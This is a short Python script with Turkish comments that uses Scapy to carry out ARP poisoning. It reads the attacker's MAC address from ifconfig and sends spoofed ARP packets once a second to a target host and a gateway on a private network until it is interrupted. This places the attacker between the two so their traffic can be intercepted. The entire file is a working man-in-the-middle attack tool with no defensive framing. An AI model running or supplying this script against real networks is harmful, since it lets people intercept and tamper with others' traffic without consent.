# Keyboard (ctrl +c ) ile kesene kadar arp istekleri gönderir
# Arp poisonin yapan python scripti


# terminalden arp tablosuna bakma:  $ arp -a


from scapy.all import *
import subprocess
import time

hedef_ip = "10.10.10.128"
gateway_ip = "10.10.10.2"

ifconfigResult = subprocess.check_output("ifconfig eth0" , shell=True).decode()
attacker_mac = re.search("ether(.*?)txqueuelen",ifconfigResult).group(1).strip()


eth = Ether (src = attacker_mac)
h_arp = ARP(hwsrc=attacker_mac , psrc =gateway_ip , pdst = hedef_ip)
g_arp = ARP(hwsrc=attacker_mac , psrc=hedef_ip ,pdst=gateway_ip)



print ("Arp Poising Attack is Starting...")


while  True:

	try:
		sendp( eth/ h_arp, verbose=False)
		sendp (eth /g_arp ,  verbose=False)
	except KeyboardInterrupt:
		print("Arp Poising Attack is Stopped")
		break
	time.sleep(1) # 1 saniye aralıkla paket gönderecek
